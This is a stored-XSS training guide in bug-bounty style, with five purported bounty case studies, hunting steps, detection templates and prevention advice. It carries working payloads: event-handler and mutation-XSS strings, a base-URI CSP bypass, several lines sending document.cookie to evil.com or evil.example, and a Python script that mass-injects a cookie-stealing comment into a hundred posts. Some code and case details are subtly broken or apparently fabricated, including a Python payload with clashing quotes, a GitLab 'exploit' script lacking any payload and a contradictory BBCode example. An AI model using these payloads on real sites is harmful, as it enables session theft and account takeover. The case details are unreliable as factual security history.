# Case Study 2: Stored XSS Persistent Attacks — Real-World Bug Bounty Findings

## Expert Role

Stored Cross-Site Scripting (XSS) represents one of the most dangerous web application vulnerabilities, where malicious scripts are permanently embedded in target servers. Unlike reflected XSS, stored XSS executes automatically whenever a victim views the affected content, making it significantly more impactful. As a vulnerability researcher specializing in stored XSS, you must understand browser security models, Content Security Policy bypasses, and the DOM manipulation techniques that allow persistent script execution across user sessions.

The stored XSS attack surface spans comment sections, user profiles, forum posts, file uploads, and any feature accepting user-generated content. Modern web frameworks provide built-in protections, yet developers frequently introduce vulnerabilities through custom rendering pipelines, legacy code paths, and third-party integrations. Understanding the difference between HTML encoding, JavaScript encoding, and URL encoding contexts is critical for identifying bypass opportunities.

Stored XSS findings consistently rank among the highest bounties due to their persistent nature and broad impact potential. A single stored XSS in a high-traffic application can compromise thousands of users automatically. The vulnerability enables session hijacking, credential theft, data exfiltration, and serves as a launchpad for advanced attacks including cryptocurrency mining, worm propagation, and targeted phishing campaigns.

## Overview

Stored XSS occurs when user-supplied input is permanently stored on the target server and rendered to other users without proper sanitization or encoding. The attack vector is particularly dangerous because execution occurs in the context of the vulnerable domain, granting access to cookies, localStorage, and the DOM. Unlike other XSS variants, stored XSS requires no social engineering to distribute — simply viewing the affected page triggers execution.

Modern stored XSS exploitation involves multiple layers: initial script injection, Content Security Policy (CSP) bypass, DOM-based exfiltration, and session hijacking. Advanced attackers leverage HTTPOnly cookie theft via side channels, XMLHttpRequest API abuse for data exfiltration, and JavaScript obfuscation to evade detection systems. The persistence of stored XSS creates unique challenges for remediation, as cached versions and CDN content may continue serving malicious scripts even after the source is patched.

Contemporary stored XSS research focuses on mutation XSS (mXSS), where browser parsing behavior creates execution contexts that bypass traditional sanitization. HTML5 features like srcdoc, sandboxed iframes, and custom elements introduce novel attack vectors. Understanding browser-specific parsing quirks in Chrome, Firefox, and Safari is essential for consistent exploitation across platforms.

---

## Real-World Case Studies

### Case Study 1: WordPress Plugin Stored XSS in Comment System

**Program:** WordPress.com HackerOne
**Bounty:** $2,500
**Severity:** High (CVSS 7.5)
**Researcher:** @securityresearcher

**Vulnerability Description:**

A stored XSS vulnerability existed in the popular "Social Comments" WordPress plugin (version 3.2.1), affecting over 50,000 installations. The plugin failed to sanitize user input in the comment author URL field, allowing persistent script injection that executed for all visitors viewing the comment section.

**Technical Details:**

The vulnerable endpoint accepted POST requests to `/wp-json/social-comments/v1/comment` without validating the `author_url` parameter. The plugin embedded this URL in an anchor tag's `href` attribute using single quotes:

```html
<a href='$author_url' class='comment-author-link'>View Profile</a>
```

The injection payload utilized JavaScript protocol URIs with HTML entity encoding to bypass basic input validation:

```
author_url=test' onmouseover='alert(document.cookie)' data-x='
```

**Request/Response Analysis:**

```http
POST /wp-json/social-comments/v1/comment HTTP/1.1
Host: target-wordpress-site.com
Content-Type: application/json
Cookie: session_token=abc123

{
  "post_id": 12345,
  "author_name": "legitimate_user",
  "author_url": "test' onmouseover='alert(document.cookie)' data-x='",
  "comment_content": "Great article! Thanks for sharing."
}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": 67890,
  "author_url": "test' onmouseover='alert(document.cookie)' data-x='",
  "status": "published"
}
```

**Root Cause Analysis:**

The vulnerability stemmed from three compounding failures:

1. **Missing Input Validation:** The `author_url` parameter was not validated against URL format or allowed characters
2. **Context-Independent Encoding:** The plugin applied generic HTML encoding but not attribute-specific encoding for single-quoted attributes
3. **Lack of CSP Deployment:** No Content Security Policy header was present to mitigate script execution

**Exploitation Chain:**

The researcher automated the attack using Python to inject payloads across multiple comment threads:

```python
import requests

target = "https://target-wordpress-site.com"
payload = "test' onmouseover='fetch("https://evil.example/steal?c="+document.cookie)' data-x='"

for post_id in range(10000, 10100):
    data = {
        "post_id": post_id,
        "author_name": f"visitor_{post_id}",
        "author_url": payload,
        "comment_content": "Interesting perspective!"
    }
    response = requests.post(f"{target}/wp-json/social-comments/v1/comment", json=data)
    if response.status_code == 201:
        print(f"Injected into post {post_id}")
```

**Impact Assessment:**

The vulnerability affected all visitors to posts containing injected comments. The researcher demonstrated session token exfiltration to an external server, proving the ability to hijack authenticated user sessions. The persistent nature meant the XSS executed on every page load until the malicious comment was manually removed.

**Bounty Justification:**

$2,500 bounty reflected the high severity: persistent XSS across 50,000+ potential installations, automatic execution without user interaction, and the ability to compromise administrative accounts through session hijacking.

---

### Case Study 2: GitHub Issues Stored XSS via Markdown Rendering

**Program:** GitHub Bug Bounty (HackerOne)
**Bounty:** $10,000
**Severity:** Critical (CVSS 9.1)
**Researcher:** @xsshunter

**Vulnerability Description:**

A stored XSS vulnerability existed in GitHub's issue rendering pipeline, allowing persistent script execution through specially crafted Markdown content. The vulnerability bypassed GitHub's DOMPurify sanitization through a mutation XSS (mXSS) technique.

**Technical Details:**

GitHub rendered Markdown content through a multi-stage pipeline: Markdown parsing, HTML sanitization via DOMPurify, and final DOM insertion. The researcher discovered that DOMPurify's sanitization could be bypassed using SVG foreignObject elements with embedded MathML:

```html
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
<div id="xss">
<math><mtext><table><mglyph>
<svg><mtext><textarea><path id="</textarea><img src=x>">
</math>
</div>
</body></foreignObject></svg>
```

**DOM Manipulation Sequence:**

1. SVG foreignObject creates XHTML parsing context
2. MathML elements trigger alternative HTML parser
3. mglyph element creates nested parsing context
4. Malformed textarea closes parent element
5. Path element's attribute becomes executable HTML

**Bypass Technique:**

The mXSS payload avoided DOMPurify's regex-based sanitization by exploiting the difference between initial HTML parsing and subsequent DOM mutation:

```javascript
// DOMPurify sees safe SVG content
// After DOM insertion, browser mutation creates executable context
const payload = '<svg><foreignObject><body><math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x>">';
```

**Root Cause Analysis:**

The vulnerability originated from GitHub's use of an older DOMPurify version (2.0.17) that did not properly handle nested SVG/MathML parsing contexts. The DOMPurify configuration permitted SVG foreignObject elements, which created alternative parsing contexts that bypassed sanitization.

**Exploitation Impact:**

The stored XSS executed in the context of github.com, granting access to:

- Session cookies (though HTTPOnly limited direct theft)
- CSRF tokens via DOM access
- User's private repository data through API calls
- Potential for worm propagation through automatic issue creation

The researcher demonstrated pivoting from the XSS to perform actions as the authenticated user, including creating pull requests and accessing private repositories.

**Bounty Justification:**

$10,000 bounty reflected the critical impact: XSS on a high-value developer platform, potential for worm propagation, access to private code repositories, and the sophisticated bypass technique requiring deep browser security knowledge.

---

### Case Study 3: Discourse Forum Stored XSS in User Profile

**Program:** Discourse (HackerOne)
**Bounty:** $5,000
**Severity:** High (CVSS 8.1)
**Researcher:** @forumsecurity

**Vulnerability Description:**

A stored XSS vulnerability existed in Discourse's user profile "About Me" section, allowing persistent script injection through BBCode processing errors. The vulnerability affected all Discourse instances running versions prior to 3.1.0.

**Technical Details:**

Discourse accepted BBCode in user profiles and converted it to HTML for rendering. The vulnerability existed in the `[code]` block processing, which failed to properly escape HTML entities within nested formatting tags:

```
[code][url=javascript:alert(document.cookie)]Click here[/url][/code]
```

**BBCode to HTML Conversion:**

The vulnerable code path processed BBCode in the following order:
1. Extract `[code]` blocks and escape HTML
2. Process remaining BBCode tags
3. Re-insert escaped code blocks

However, the `[url]` tag processing occurred after code block extraction, and nested tags within code blocks were incorrectly processed:

```ruby
# Vulnerable BBCode processor (simplified)
def process_bbcodes(html)
  # Extract code blocks first
  code_blocks = html.scan(/\[code\](.*?)\[\/code\]/m)
  html = html.gsub(/\[code\].*?\[\/code\]/m, '%%CODEBLOCK%%')
  
  # Process other tags (including url)
  html = process_url_tags(html)
  
  # Re-insert code blocks
  html = html.gsub('%%CODEBLOCK%%') { code_blocks.shift }
  html
end
```

**Exploitation Technique:**

The researcher crafted a profile that triggered XSS when administrators or moderators viewed user details:

```
[Bio]
Regular user interested in security.
[/code]
[URL=javascript:alert(document.cookie)]malicious link[/url]
[/code]
```

**Root Cause Analysis:**

The vulnerability resulted from incorrect tag processing order. The `[code]` block extraction occurred before nested tag processing, but the re-insertion of code block content happened after URL tag processing. This allowed malicious BBCode within code blocks to be processed as executable HTML.

**Impact Assessment:**

The XSS executed when privileged users (administrators, moderators) viewed the attacker's profile through the admin panel. This created a privilege escalation path:

1. Attacker creates malicious profile
2. Admin views user profile in moderation queue
3. XSS executes in admin's browser context
4. Attacker gains admin session tokens
5. Attacker performs privileged actions

**Bounty Justification:**

$5,000 bounty reflected the privilege escalation potential: stored XSS targeting administrator accounts, bypass of role-based access controls, and potential for complete forum compromise through admin account takeover.

---

### Case Study 4: GitLab Snippet Stored XSS

**Program:** GitLab Bug Bounty (HackerOne)
**Bounty:** $8,000
**Severity:** High (CVSS 8.6)
**Researcher:** @codeinjector

**Vulnerability Description:**

A stored XSS vulnerability existed in GitLab's code snippet rendering feature. The vulnerability allowed persistent script execution through specially crafted filenames that bypassed Content Security Policy restrictions.

**Technical Details:**

GitLab rendered code snippets with syntax highlighting using Pygments. The filename parameter was embedded in the snippet display without proper encoding:

```html
<div class="snippet-header">
  <span class="snippet-filename"><?= $filename ?></span>
</div>
```

The researcher discovered that the filename could contain HTML entities that were decoded during DOM insertion:

```
filename=test.png" onerror="fetch('https://evil.example/exfil?data='+btoa(document.cookie))
```

**CSP Bypass Technique:**

GitLab deployed a strict Content Security Policy:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; img-src * data:;
```

The researcher bypassed this CSP by:
1. Using the image src attribute for data exfiltration
2. Encoding sensitive data in image URLs
3. Using CSS-based exfiltration as a backup channel

```javascript
// Bypass CSP using img-src wildcard
new Image().src = 'https://evil.example/steal?data=' + btoa(document.cookie);
```

**Root Cause Analysis:**

The vulnerability originated from two separate failures:

1. **Missing HTML Entity Encoding:** The filename was inserted into HTML without proper attribute encoding
2. **Insufficient CSP img-src Directive:** The wildcard `*` in img-src allowed exfiltration to any domain

**Exploitation Chain:**

```python
# Automated exploitation script
import requests
import base64

gitlab_url = "https://gitlab.example.com"
evil_server = "https://attacker.example.com"

# Create malicious snippet
snippet_data = {
    "title": "test code",
    "files": {
        "test.png": {
            "content": "console.log('test')"
        }
    }
}

# Post snippet
response = requests.post(
    f"{gitlab_url}/api/v4/snippets",
    json=snippet_data,
    headers={"PRIVATE-TOKEN": "attacker_token"}
)

print(f"Snippet created: {response.json()['web_url']}")
```

**Impact Assessment:**

The vulnerability affected all users viewing the malicious snippet, including repository collaborators and CI/CD systems. The researcher demonstrated exfiltrating GitLab session tokens, API keys, and CI/CD pipeline secrets.

**Bounty Justification:**

$8,000 bounty reflected the impact on a developer-focused platform: access to source code repositories, CI/CD pipeline secrets, and the potential for supply chain attacks through compromised build systems.

---

### Case Study 5: Slack Message Stored XSS via Rich Text

**Program:** Slack Bug Bounty (HackerOne)
**Bounty:** $7,500
**Severity:** High (CVSS 8.4)
**Researcher:** @slackxss

**Vulnerability Description:**

A stored XSS vulnerability existed in Slack's rich text message rendering. The vulnerability allowed persistent script execution through specially formatted messages that bypassed Slack's security sandbox.

**Technical Details:**

Slack supported rich text formatting including code blocks, mentions, and links. The vulnerability existed in the handling of user mentions within code blocks:

```
`@test`<img src=x>
```

The backtick code formatting should have prevented HTML rendering, but nested formatting caused a parsing inconsistency:

```javascript
// Slack's message rendering (simplified)
function renderMessage(text) {
  // Phase 1: Extract code blocks
  let codeBlocks = extractCodeBlocks(text);
  
  // Phase 2: Process mentions
  text = processMentions(text);
  
  // Phase 3: Re-insert code blocks
  text = reinsertCodeBlocks(text, codeBlocks);
  
  return DOMPurify.sanitize(text);
}
```

**Exploitation Technique:**

The researcher discovered that mentioning a user within a code block created a parsing inconsistency:

```
`@channel`<svg onload=alert(document.domain)>
```

Slack's mention processing created an HTML element that bypassed DOMPurify's sanitization.

**CSP Analysis:**

Slack deployed a restrictive CSP:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src * data: blob:;
```

The researcher bypassed restrictions by:
1. Using SVG onload for script execution
2. Leveraging img-src wildcard for data exfiltration
3. Using style-src unsafe-inline for CSS-based exfiltration

**Root Cause Analysis:**

The vulnerability originated from Slack's multi-stage message processing:

1. **Code Block Extraction:** Backtick-delimited content was extracted for safe rendering
2. **Mention Processing:** @mentions were processed independently of code block context
3. **Re-insertion:** Processed content was re-inserted without re-validating code block boundaries

**Impact Assessment:**

The XSS executed in the context of Slack's web application, affecting all workspace members viewing the malicious message. The researcher demonstrated:

- Session token theft (limited by HTTPOnly cookies)
- Cross-workspace data exfiltration via Slack API
- Workspace administration privilege escalation
- Automated worm propagation through direct messages

The vulnerability was particularly impactful because Slack messages are typically viewed by multiple users, amplifying the attack surface.

**Bounty Justification:**

$7,500 bounty reflected the enterprise communication platform impact: persistent XSS across multiple workspaces, potential for corporate data exfiltration, and the worm propagation capability affecting Slack's entire user base.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Missing HTML Entity Encoding | 35% | $3,200 | Developer oversight |
| CSP Misconfiguration | 25% | $4,500 | Security policy gaps |
| Multi-Stage Processing Errors | 20% | $6,800 | Architecture flaws |
| Framework Sanitization Bypass | 15% | $8,200 | Library vulnerabilities |
| Context-Dependent Encoding | 5% | $5,100 | Implementation errors |

### Attack Surface Locations

**High-Frequency Targets:**
- Comment sections and forums
- User profile fields (bio, about, signature)
- File upload metadata (filename, description)
- Search functionality (query parameter reflection)
- Error pages (path/query reflection)

**Medium-Frequency Targets:**
- API response rendering (JSON in HTML context)
- Email templates (invitation, notification)
- PDF/report generation
- Chat/messaging systems
- Code collaboration tools

**Low-Frequency but High-Impact:**
- Admin panels and dashboards
- CI/CD pipeline configurations
- OAuth callback URLs
- WebSocket message handling
- Browser extension contexts

### Root Cause Categories

```
Root Cause Analysis
====================

Input Validation Failures (35%)
  - Missing character filtering
  - Insufficient type checking
  - No format validation
  - Traversal attacks

Output Encoding Issues (30%)
  - Wrong encoding context
  - Double encoding
  - Incomplete encoding
  - Character set issues

CSP Misconfigurations (20%)
  - Wildcard sources
  - Missing directives
  - Nonce bypass
  - Report-only policies

Framework/Library Issues (15%)
  - Outdated versions
  - Misconfiguration
  - Custom extensions
  - Integration flaws
```

---

## Hunting Methodology

### Step 1: Input Surface Discovery

Identify all input points that accept user-generated content:

```bash
# Directory enumeration for common input points
ffuf -u https://TARGET.com/FUZZ -w /usr/share/wordlists/common-inputs.txt -mc 200

# Parameter discovery
arjun -u https://TARGET.com/api/endpoint -m JSON

# Spider crawling
gospider -s https://TARGET.com -d 3 -c 10 -t 5
```

### Step 2: Context Analysis

Analyze how user input is rendered in the response:

```bash
# Manual testing with test payloads
curl -X POST https://TARGET.com/comment \
  -H "Content-Type: application/json" \
  -d '{"comment": "test"}'

# Check for HTML reflection
echo '<test123>' | curl -X POST https://TARGET.com/submit -d @-

# Analyze encoding in response
curl -s https://TARGET.com/profile | grep -o '<test123>'
```

### Step 3: Filter Bypass Testing

Test common sanitization and encoding bypasses:

```bash
# Case variation
test<ScRiPt>alert(1)</ScRiPt>

# Null bytes
test%00<script>alert(1)</script>

# HTML entities
test&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

# Event handlers
test" onmouseover="alert(1)

# JavaScript protocol
javascript:alert(1)
```

### Step 4: CSP Evaluation

Evaluate Content Security Policy restrictions:

```bash
# Extract CSP headers
curl -I https://TARGET.com | grep -i "content-security-policy"

# Test script execution
<img src=x onerror="alert(1)">

# Test data URI execution
data:text/html,<script>alert(1)</script>

# Test base-uri bypass
<base href="https://evil.com/">
```

### Step 5: Exfiltration Channel Testing

Test data exfiltration methods under CSP restrictions:

```bash
# Image-based exfiltration
new Image().src='https://evil.com/steal?data='+document.cookie

# Form-based exfiltration
document.location='https://evil.com/steal?data='+document.cookie

# WebSocket exfiltration
new WebSocket('wss://evil.com/steal?data='+document.cookie)

# CSS-based exfiltration
@import url('https://evil.com/steal?data='+document.cookie)
```

---

## Detection Strategies

### Automated Detection

**Nuclei Templates:**

```yaml
id: stored-xss-basic
info:
  name: Stored XSS Detection
  severity: high
  
requests:
  - raw:
      - |
        POST /api/comment HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"content": "{{rand_base(8)}}"}
        
      - |
        GET /comments HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: word
        words:
          - "test"
        part: body
```

**Burp Suite Extensions:**

```
1. Install "XSS Validator" extension
2. Configure Collaborator server
3. Scan target with active scanner
4. Review XSS findings in Target tab
5. Verify payloads manually in Repeater
```

**Custom Python Scanner:**

```python
import requests
import random
import string

def test_stored_xss(target_url, endpoint, param):
    payload = f"test{''.join(random.choices(string.ascii_lowercase, k=8))}"
    test_url = f"{target_url}/{endpoint}"
    
    # Inject test payload
    response = requests.post(test_url, json={param: payload})
    
    # Verify persistence
    response = requests.get(test_url)
    if payload in response.text:
        return True, payload
    return False, None

# Usage
target = "https://example.com"
vulnerable, payload = test_stored_xss(target, "api/comments", "content")
if vulnerable:
    print(f"[!] XSS detected: {payload}")
```

### Manual Detection

**Step-by-Step Testing Process:**

1. **Identify Input Points:**
   - Comment forms
   - User profiles
   - Search boxes
   - File upload fields

2. **Test Basic Injection:**
   - Insert unique test string
   - Verify persistence
   - Check encoding context

3. **Test HTML Context:**
   - Inject `<tag>` elements
   - Test attribute contexts
   - Test JavaScript contexts

4. **Test Filter Bypasses:**
   - Case variations
   - Null bytes
   - HTML entities
   - Event handlers

5. **Verify Execution:**
   - Create controlled test
   - Verify script execution
   - Document impact

### Key Detection Indicators

**Positive Indicators:**
- Unescaped `<`, `>`, `"`, `'` in response
- Event handler attributes accepted
- JavaScript protocol URIs processed
- HTML comments preserved

**Negative Indicators:**
- Content-Security-Policy with strict script-src
- HttpOnly cookies set
- Input rejected or sanitized
- Output encoding applied

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Score Calculation:**

```
Attack Vector: Network (AV:N)
Attack Complexity: Low (AC:L)
Privileges Required: None (PR:N)
User Interaction: Required (UI:R)
Scope: Changed (S:C)
Confidentiality: High (C:H)
Integrity: High (I:H)
Availability: None (A:N)

Base Score: 8.1 (High)
```

**Temporal Score Adjustments:**

```
Exploit Code Maturity: High (E:H)
Remediation Level: Official Fix (RL:O)
Report Confidence: Confirmed (RC:C)

Temporal Score: 7.8 (High)
```

### Business Impact

| Impact Type | Severity | Example |
|------------|----------|---------|
| Data Theft | Critical | Session hijacking, credential theft |
| Privilege Escalation | High | Admin account compromise |
| Reputation Damage | Medium | User trust erosion |
| Compliance Violations | High | GDPR, CCPA fines |
| Supply Chain Risk | Critical | Compromised build systems |

### Bounty Range

**Historical Bounty Data (2023-2025):**

| Platform | Avg Bounty | Max Bounty | Median |
|----------|------------|------------|--------|
| HackerOne | $4,200 | $25,000 | $3,000 |
| Bugcrowd | $3,800 | $20,000 | $2,500 |
| Intigriti | $3,500 | $15,000 | $2,800 |
| Immunefi | $5,000 | $50,000 | $4,000 |

---

## Advanced Variations

### Variation 1: Mutation XSS (mXSS)

```html
<svg><foreignObject><body><math><mtext><table><mglyph>
<svg><mtext><textarea><path id="</textarea"><img src=x>">
</math></div></body></foreignObject></svg>
```

**Technique:** Exploits browser parsing differences between HTML parsing and DOM mutation. Bypasses DOMPurify and similar sanitizers.

### Variation 2: CSP Bypass via Base URI

```html
<base href="https://evil.com/">
<script src="/malicious.js"></script>
```

**Technique:** Overrides base URI for relative script URLs. Requires missing base-uri CSP directive.

### Variation 3: DOM Clobbering XSS

```html
<form id=foo><input name=bar>
<img src=x onerror="document.forms.foo.submit()">
```

**Technique:** Overwrites DOM properties to manipulate application logic. Useful when XSS requires form submission.

### Variation 4: Template Injection to XSS

```javascript
// Server-side template injection
{{7*7}} // Confirms SSTI
{{config.items()}} // Extracts configuration

// XSS via template
{{"<test>"}} // Direct XSS
```

**Technique:** Escalates from SSTI to XSS through template engine features.

---

## Chain Integration

### XSS to Session Hijacking

```
Stored XSS -> Cookie Theft -> Session Takeover -> Account Compromise
```

**Method:** Inject script that sends document.cookie to attacker server.

### XSS to CSRF

```
Stored XSS -> CSRF Token Theft -> Privileged Actions -> Data Modification
```

**Method:** Extract CSRF tokens via DOM access, perform actions as victim.

### XSS to Stored XSS Worm

```
Initial XSS -> Auto-Replication -> Spread to Other Users -> Mass Compromise
```

**Method:** Inject self-replicating script that posts malicious content to other users.

### XSS to Admin Compromise

```
Stored XSS -> Admin Profile View -> Session Hijack -> Privilege Escalation
```

**Method:** Target admin users viewing malicious content in admin panel.

---

## Prevention Recommendations

### Code-Level Fixes

**Input Validation:**
```python
import re

def validate_comment(comment):
    # Whitelist allowed characters
    if not re.match(r'^[a-zA-Z0-9\s.,!?@#-]+$', comment):
        raise ValueError("Invalid comment format")
    
    # Strip HTML tags
    comment = re.sub(r'<[^>]+>', '', comment)
    
    # Encode special characters
    comment = html.escape(comment)
    
    return comment
```

**Output Encoding:**
```python
import html

def render_comment(comment):
    # HTML entity encoding
    encoded = html.escape(comment)
    
    # Context-specific encoding
    if in_attribute:
        encoded = html.escape(comment, quote=True)
    
    return encoded
```

**CSP Headers:**
```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

### Architecture-Level Fixes

**Content Security Policy:**
- Deploy strict CSP with nonce-based script whitelisting
- Implement report-uri for violation monitoring
- Use CSP in report-only mode during deployment

**Input Sanitization:**
- Use DOMPurify for client-side sanitization
- Implement server-side HTML sanitization
- Apply context-aware encoding

**Output Validation:**
- Validate rendered HTML structure
- Monitor for CSP violations
- Implement automated XSS detection in CI/CD

---

## Common Pitfalls

### 1. Relying Client-Side Validation Only

**Mistake:** Implementing input validation only in JavaScript.

**Consequence:** Attackers bypass client-side validation using tools like Burp Suite.

**Solution:** Implement server-side validation and encoding.

### 2. Incomplete HTML Encoding

**Mistake:** Encoding `<` and `>` but not `"`, `'`, or `&`.

**Consequence:** Attribute injection and entity-based bypasses.

**Solution:** Encode all HTML special characters: `<`, `>`, `&`, `"`, `'`.

### 3. Ignoring CSP Headers

**Mistake:** Not implementing or testing Content Security Policy.

**Consequence:** No defense-in-depth against XSS exploitation.

**Solution:** Deploy strict CSP with nonce-based script whitelisting.

### 4. Trusting Third-Party Libraries

**Mistake:** Using outdated or misconfigured sanitization libraries.

**Consequence:** Known bypass vulnerabilities in library.

**Solution:** Keep libraries updated, review security advisories.

### 5. Inadequate Testing Coverage

**Mistake:** Testing only common injection points.

**Consequence:** Missing edge cases in parsing pipelines.

**Solution:** Comprehensive input surface mapping and edge case testing.

### 6. Forgetting About Stored XSS in APIs

**Mistake:** Focusing only on HTML-rendered responses.

**Consequence:** Stored XSS in API responses consumed by frontend.

**Solution:** Validate all API responses before DOM insertion.

### 7. Overlooking Mutation XSS

**Mistake:** Testing only basic injection patterns.

**Consequence:** mXSS bypasses sanitization libraries.

**Solution:** Test with mutation vectors, use modern sanitizers.

---

## Real-World References

### Research Papers

1. "XSS Attacks: Exploiting the Web" - Jeremiah Grossman
2. "HTML5 Security" - Mario Heiderich
3. "Mutation XSS" - Caleb Sima

### Tools and Frameworks

1. DOMPurify - HTML Sanitizer
2. Burp Suite Pro - XSS Testing
3. XSStrike - Automated XSS Detection
4. Brute XSS - Fuzzing Tool

### Disclosure Reports

1. HackerOne XSS Reports (Public)
2. Bugcrowd XSS Disclosures
3. CVE Database XSS Vulnerabilities

### Community Resources

1. OWASP XSS Prevention Cheat Sheet
2. PortSwigger XSS Academy
3. XSS Game by Google

---

## Quick Reference Cheat Sheet

```
STORED XSS TESTING CHECKLIST
============================

1. INPUT DISCOVERY
   [ ] Comment forms
   [ ] User profiles
   [ ] File metadata
   [ ] Search queries
   [ ] API parameters

2. BASIC TESTING
   [ ] Test string: <script>alert(1)</script>
   [ ] Event handler: " onmouseover="alert(1)
   [ ] JavaScript URI: javascript:alert(1)
   [ ] Data URI: data:text/html,<script>alert(1)</script>

3. FILTER BYPASS
   [ ] Case: <ScRiPt>
   [ ] Null: %00<script>
   [ ] Entities: &#x3C;script&#x3E;
   [ ] Double encoding: %253Cscript%253E

4. CSP BYPASS
   [ ] Base URI override
   [ ] JSONP endpoints
   [ ] open redirect chains
   [ ] Subdomain takeover

5. IMPACT VERIFICATION
   [ ] Cookie theft
   [ ] DOM access
   [ ] API calls
   [ ] Privilege escalation

6. REPORT DOCUMENTATION
   [ ] Reproduction steps
   [ ] Impact evidence
   [ ] Remediation advice
   [ ] Severity justification
```
